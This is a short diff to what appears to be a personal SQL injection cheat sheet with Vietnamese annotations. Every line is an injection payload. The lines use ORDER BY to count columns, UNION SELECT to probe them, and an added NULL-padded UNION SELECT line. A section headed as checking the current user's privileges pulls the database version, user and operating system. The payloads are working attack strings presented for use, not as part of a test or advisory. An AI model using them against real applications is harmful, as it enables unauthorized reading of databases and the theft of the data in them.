@@ -2,6 +2,7 @@
 99999 ORDER BY {số cột} -- 
 xong thì:
 99999 UNION SELECT 1,2,3... --
+' UNION SELECT NULL,NULL,NULL,NULL-- 
 
 -------kiểm tra quyền của user hiện tại -------
 99999 UNION SELECT 1,@@version,USER(),@@version_compile_os --
